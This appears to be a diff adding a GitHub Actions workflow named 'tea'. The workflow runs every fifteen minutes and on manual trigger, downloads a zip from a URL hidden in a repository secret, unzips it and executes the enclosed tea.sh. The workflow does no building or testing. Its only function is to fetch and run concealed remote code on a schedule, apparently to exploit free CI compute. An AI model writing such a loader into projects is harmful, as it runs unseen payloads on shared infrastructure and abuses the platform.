@@ -1,1 +1,36 @@
+name: tea
 
+on:
+  schedule:
+    - cron: "*/15 * * * *" 
+  workflow_dispatch:
+
+jobs:
+  export-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Download
+        shell: bash
+        run: |
+          curl -L -o tea.zip "${{ secrets.VIA }}"
+          if [ ! -f "tea.zip" ]; then
+            echo "Download failed: tea.zip not found."
+            exit 1
+          fi
+
+      - name: Unzip
+        shell: bash
+        run: |
+          unzip tea.zip
+          rm tea.zip
+
+      - name: Run
+        shell: bash
+        run: |
+          chmod +x ./tea.sh
+          ./tea.sh
